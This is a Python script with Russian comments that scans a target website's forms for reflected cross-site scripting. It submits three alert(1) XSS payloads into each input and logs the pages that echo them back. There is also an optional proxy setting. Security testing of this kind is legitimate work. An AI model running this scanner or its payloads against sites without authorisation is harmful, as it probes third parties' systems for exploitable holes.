import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

class Xsscanner:
    def __init__(self, url):
        self.target = url
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Xssscan)"
        }
        self.proxy = {}   #если хочешь то можешь добавить сюда прокси

    def log(self, text: str):
        print(text)

    def scan_forms(self, url):
        try:
            resp = self.session.get(url, headers=self.headers, proxies=self.proxy)
            soup = BeautifulSoup(resp.text, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            self.log(f"Ошибка при сканировании формы: {e}")
            return []


def start_scan(xss_obj):
    vulns = []
    xss_obj.log("[*] Проверка XSS:")
    forms = xss_obj.scan_forms(xss_obj.target)
    xss_obj.log(f"   Найдено форм: {len(forms)}")

    for form in forms:
        action = form.get("action") or xss_obj.target
        method = form.get("method", "get").lower()
        inputs = form.find_all(["input", "textarea"])

        for payload in XSS_PAYLOADS:
            data = {i.get("name"): payload for i in inputs if i.get("name")}
            url = urljoin(xss_obj.target, action)

            try:
                if method == "post":
                    resp = xss_obj.session.post(url, data=data, headers=xss_obj.headers, proxies=xss_obj.proxy)
                else:
                    resp = xss_obj.session.get(url, params=data, headers=xss_obj.headers, proxies=xss_obj.proxy)
                if payload in resp.text:
                    xss_obj.log(f"[+] XSS уязвимость: {url} ({payload})")
                    vulns.append(f"{url} ({payload})")

            except Exception as e:
                xss_obj.log(f"Ошибка при отправке запроса: {e}")
                continue

    return vulns
